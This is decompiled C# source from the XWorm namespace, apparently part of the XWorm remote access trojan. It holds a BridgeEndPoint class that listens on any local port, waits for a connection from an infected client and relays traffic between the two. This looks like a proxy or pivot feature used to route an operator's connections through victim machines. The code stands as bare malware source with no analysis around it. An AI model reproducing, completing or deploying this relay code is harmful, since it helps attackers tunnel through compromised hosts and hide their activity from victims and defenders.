using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace XWorm
{
	// Token: 0x0200003B RID: 59
	public class BridgeEndPoint
	{
		// Token: 0x060009F4 RID: 2548 RVA: 0x0005816C File Offset: 0x0005636C
		public BridgeEndPoint(int localport, string remoteIP, string key)
		{
			BridgeEndPoint.bool_0 = true;
			try
			{
				this.string_1 = key;
				BridgeEndPoint.tcpListener_0 = new TcpListener(IPAddress.Any, localport);
				BridgeEndPoint.tcpListener_0.Start(20);
				this.string_0 = remoteIP;
				Thread thread = new Thread(new ThreadStart(this.method_0));
				thread.Start();
			}
			catch (Exception ex)
			{
				BridgeEndPoint.Close();
			}
		}

		// Token: 0x060009F5 RID: 2549 RVA: 0x000581F4 File Offset: 0x000563F4
		private void method_0()
		{
			try
			{
				while (BridgeEndPoint.bool_0)
				{
					TcpClient tcpClient_ = BridgeEndPoint.tcpListener_0.AcceptTcpClient();
					while (this.tcpClient_0 == null)
					{
						Thread.Sleep(100);
					}
					TcpClient tcpClient_2 = this.tcpClient_0;
					this.tcpClient_0 = null;
					Relay relay = new Relay();
					relay.method_0(tcpClient_, tcpClient_2);
					this.tcpClient_1 = tcpClient_2;
					Thread.Sleep(100);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060009F6 RID: 2550 RVA: 0x00058284 File Offset: 0x00056484
		public static void Close()
		{
			try
			{
				BridgeEndPoint.tcpListener_0.Stop();
				BridgeEndPoint.bool_0 = false;
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x04000422 RID: 1058
		private static TcpListener tcpListener_0;

		// Token: 0x04000423 RID: 1059
		private string string_0;

		// Token: 0x04000424 RID: 1060
		public string string_1;

		// Token: 0x04000425 RID: 1061
		public TcpClient tcpClient_0;

		// Token: 0x04000426 RID: 1062
		public TcpClient tcpClient_1;

		// Token: 0x04000427 RID: 1063
		private static bool bool_0;
	}
}
